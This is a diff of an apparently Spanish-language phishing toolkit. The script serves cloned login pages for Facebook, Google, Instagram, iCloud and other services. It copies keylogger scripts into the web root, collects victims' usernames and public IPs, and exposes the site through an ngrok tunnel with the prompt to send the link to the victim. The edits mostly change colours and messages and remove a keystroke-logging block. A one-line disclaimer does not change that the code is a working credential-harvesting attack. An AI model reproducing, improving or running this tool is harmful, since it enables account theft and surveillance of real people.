@@ -512,8 +512,8 @@ def phish():
     checkNgrok()
     runPEnv()
     def custom(): #Question where user can input custom web-link
-        print("\n [+] A que pagina quieres que rediriga a la persona luego del ataque:".format(CYAN, DEFAULT))
-        custom = input("\n [+] Eleccion > ")
+        print(Green+"\n [+] A que pagina quieres que rediriga a la persona luego del ataque:")
+        custom = input(Green+"\n [+] Eleccion > ")
         if 'http://' or 'https://' in custom:
             pass
         else:
@@ -570,10 +570,10 @@ def end():
     print ("Hasta luego")
 
 def loadModule(module):
-       print("Building site..." % module)
+       print(Green+"Creando sitio...")
 #Menu de seleccion de las paginas de phishing
 def runPhishing(page, option2): 
-    os.system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
+    os.system("rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/")
     if option2 == '1' and page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and page == 'Facebook':
@@ -635,8 +635,8 @@ def log(ctx): #Writing log
 
 
 def waitCreds():
-    print("[+]Empezando Hackeo... ")
-    print("[+]Esperando por informacion... \n")
+    print(""+Green+"[+] Empezando Hackeo... ")
+    print(""+Green+"[+] Esperando por informacion... \n")
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
@@ -652,7 +652,7 @@ def waitCreds():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('IP PUBLICA DE LA VICTIMA: (.*?)\n', lines).group(1)
-                resp = urlopen('https://ipinfo.io/%s/json' % ip)
+                resp = urlopen('https://ipinfo.io/json')
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
                     log('======================================================================'.format(RED, DEFAULT))
@@ -668,24 +668,12 @@ def waitCreds():
                     log(' \n{0}Provincia/Estado: %s \nCiudad: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
                 os.system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 log('======================================================================'.format(RED, DEFAULT))
-
-        creds.close()
-
-        with open('Server/www/KeyloggerData.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                log('______________________________________________________________________'.format(RED, DEFAULT))
-                log(' {0}[ TECLAS PRESIONADAS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
-                os.system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-                log('______________________________________________________________________'.format(RED, DEFAULT))
-
         creds.close()
 
 
 def runPEnv(): #menu where user select what they wanna use
     os.system('clear')
     print ("No uses esta herramienta para el mal".format(GREEN, DEFAULT, CYAN))
-
     for i in range(101):
         time.sleep(0.01)
         stdout.write("\r [+] Preparando todo... %d%%" % i)
@@ -697,7 +685,7 @@ def runPEnv(): #menu where user select what they wanna use
     else:
         print (" --> NO TIENES INSTALADO PHP: \n {0}*{1} Por favor instala PHP y corre el script de vuelta")
         exit(0)
-    option = input("\nSekecciona una opcion:\n\n 1 Facebook\n\n 2 Google\n\n 3 LinkedIn\n\n 4 GitHub\n\n 5 StackOverflow\n\n 6 WordPress\n\n 7 Twitter\n\n 8 Instagram\n\n 9 Snapchat\n\n 10 Yahoo\n\n 11 Twitch\n\n 12 Microsoft\n\n 13 Steam\n\n 14 VK\n\n 15 iCloud\n\n ")
+    option = input(""+Green+"\nSelecciona una opcion:\n\n 1-Facebook\n\n 2-Google\n\n 3-LinkedIn\n\n 4-GitHub\n\n 5-StackOverflow\n\n 6-WordPress\n\n 7-Twitter\n\n 8-Instagram\n\n 9-Snapchat\n\n 10-Yahoo\n\n 11-Twitch\n\n 12-Microsoft\n\n 13-Steam\n\n 14-VK\n\n 15-iCloud\n\n "+Red+"Eleccion --> "+Reset)
     if option == '1':
         loadModule('Facebook')
         option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n 2 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
@@ -765,12 +753,12 @@ def runNgrok():
     os.system('./Server/ngrok http 1111 > /dev/null &')
     while True:
         time.sleep(2)
-        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.txt')
-        urlFile = open('ngrok.txt', 'r')
+        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > Server/Datos/ngrok.txt')
+        urlFile = open('Server/Datos/ngrok.txt', 'r')
         url = urlFile.read()
         urlFile.close()
         if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-            print("\n [+]Url de Ngrok : " + url + "\n Pasa el link a la victima para el ataque")
+            print(""+Green+"\n [+] Url de Ngrok : " + url + "\n Pasa el link a la victima para el ataque \n")
             break
 
 
